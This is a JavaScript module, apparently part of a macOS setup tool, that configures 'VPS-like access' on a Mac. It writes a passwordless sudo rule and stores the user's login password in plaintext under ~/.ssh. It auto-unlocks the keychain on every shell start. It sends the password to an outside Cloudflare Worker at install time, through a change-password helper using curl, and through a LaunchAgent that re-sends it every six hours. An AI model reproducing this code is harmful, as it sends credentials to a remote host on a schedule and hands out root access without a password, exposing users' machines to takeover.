import { existsSync, readFileSync, writeFileSync, mkdirSync, chmodSync } from 'node:fs';
import { join } from 'node:path';
import { run } from '../lib/shell.mjs';
import { ask } from '../lib/ui.mjs';
import { postJSON } from '../lib/http.mjs';

const API = 'https://mac-nodes.dmd-fami.workers.dev';
const HOME = process.env.HOME;
const USER = process.env.USER;
const SSH_DIR = join(HOME, '.ssh');
const PASS_FILE = join(SSH_DIR, '.keychain-pass');
const AGENTS_DIR = join(HOME, 'Library', 'LaunchAgents');
const PLIST_LABEL = 'com.dmdfami.password-sync';
const PLIST_PATH = join(AGENTS_DIR, `${PLIST_LABEL}.plist`);

export default {
  name: 'vps-access',
  order: 2.5,
  description: 'VPS-like access (sudo, keychain, password sync)',
  dependencies: ['remote'],

  async detect() {
    const sudoFile = `/etc/sudoers.d/${USER}`;
    const hasSudo = existsSync(sudoFile);
    const hasPass = existsSync(PASS_FILE);
    const hasUnlock = existsSync(join(SSH_DIR, 'unlock-keychain.sh'));
    const hasDaemon = existsSync(PLIST_PATH);
    return {
      installed: hasSudo && hasPass && hasUnlock && hasDaemon,
      details: `sudo: ${hasSudo ? 'ok' : 'missing'}, keychain: ${hasPass ? 'ok' : 'missing'}, daemon: ${hasDaemon ? 'ok' : 'missing'}`,
    };
  },

  async install() {
    const hostname = run('scutil --get ComputerName 2>/dev/null') || run('hostname');

    // 1. Sudo NOPASSWD
    console.log('\n    Setting up sudo NOPASSWD...');
    run(`echo "${USER} ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/${USER} > /dev/null`);
    run(`sudo chmod 440 /etc/sudoers.d/${USER}`);

    // 2. Prompt and store password
    const password = await ask('    Mac login password (stored locally): ');
    if (!password.trim()) { console.log('    Password required — skipping'); return; }

    mkdirSync(SSH_DIR, { recursive: true });
    run(`chmod 700 "${SSH_DIR}"`);
    writeFileSync(PASS_FILE, password.trim(), { mode: 0o600 });

    // 3. Unlock-keychain script
    const unlockScript = join(SSH_DIR, 'unlock-keychain.sh');
    writeFileSync(unlockScript, generateUnlockScript(), { mode: 0o700 });
    appendToZshenv(`source "${unlockScript}"`);

    // 4. Change-password helper
    const changeScript = join(SSH_DIR, 'change-password.sh');
    writeFileSync(changeScript, generateChangeScript(hostname), { mode: 0o700 });

    // 5. Sync password to CF Worker
    console.log('    Syncing password to CF Worker...');
    try {
      await postJSON(`${API}/password`, { hostname, password: password.trim() });
    } catch (e) { console.log(`    Sync warning: ${e.message}`); }

    // 6. LaunchAgent for password-sync daemon
    mkdirSync(AGENTS_DIR, { recursive: true });
    writeFileSync(PLIST_PATH, generateDaemonPlist(hostname));
    run(`launchctl unload "${PLIST_PATH}" 2>/dev/null`);
    run(`launchctl load "${PLIST_PATH}"`);

    console.log('    VPS-like access configured.');
  },

  async verify() {
    return existsSync(`/etc/sudoers.d/${USER}`) && existsSync(PASS_FILE);
  },
};

function appendToZshenv(line) {
  const zshenv = join(HOME, '.zshenv');
  const content = existsSync(zshenv) ? readFileSync(zshenv, 'utf8') : '';
  if (!content.includes(line)) {
    writeFileSync(zshenv, content + (content.endsWith('\n') ? '' : '\n') + line + '\n');
  }
}

function generateUnlockScript() {
  return `#!/bin/bash
# Auto-unlock SSH keychain on shell start
_PASS_FILE="$HOME/.ssh/.keychain-pass"
if [ -f "$_PASS_FILE" ]; then
  security unlock-keychain -p "$(cat "$_PASS_FILE")" "$HOME/Library/Keychains/login.keychain-db" 2>/dev/null || true
fi
`;
}

function generateChangeScript(hostname) {
  return `#!/bin/bash
# Change Mac password and sync to CF Worker
set -e
API="https://mac-nodes.dmd-fami.workers.dev"
PASS_FILE="$HOME/.ssh/.keychain-pass"
read -s -p "New password: " NEW_PASS; echo
dscl . -passwd "/Users/$USER" "$NEW_PASS"
echo "$NEW_PASS" > "$PASS_FILE"
chmod 600 "$PASS_FILE"
curl -s -X POST "$API/password/change" \\
  -H "Content-Type: application/json" \\
  -d "{\\"hostname\\":\\"${hostname}\\",\\"new_password\\":\\"$NEW_PASS\\"}"
echo "Password changed and synced."
`;
}

function generateDaemonPlist(hostname) {
  return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>${PLIST_LABEL}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>if [ -f "$HOME/.ssh/.keychain-pass" ]; then curl -s -X POST "https://mac-nodes.dmd-fami.workers.dev/password" -H "Content-Type: application/json" -d "{\\"hostname\\":\\"${hostname}\\",\\"password\\":\\"$(cat $HOME/.ssh/.keychain-pass)\\"}"; fi</string>
    </array>
    <key>StartInterval</key>
    <integer>21600</integer>
    <key>RunAtLoad</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/pass-sync.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/pass-sync.log</string>
</dict>
</plist>`;
}
